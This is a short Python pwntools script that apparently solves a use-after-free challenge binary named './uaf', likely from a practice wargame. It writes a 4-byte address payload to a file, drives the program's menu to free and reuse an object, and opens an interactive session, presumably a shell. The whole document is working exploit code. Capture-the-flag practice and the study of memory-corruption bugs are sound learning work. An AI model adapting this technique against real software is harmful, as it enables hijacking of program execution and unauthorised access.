#!/usr/bin/env python

from pwn import *
import os

PAYLOAD = p32(0x401568)
BIN_NAME="./uaf"
args = [BIN_NAME, str(len(PAYLOAD)), "payload"]

with open("payload", "w") as f:
	f.write(PAYLOAD)

proc = process(executable=BIN_NAME, argv=args)

proc.send("3\n2\n2\n1\n")
proc.interactive()
# os.system("rm ./payload")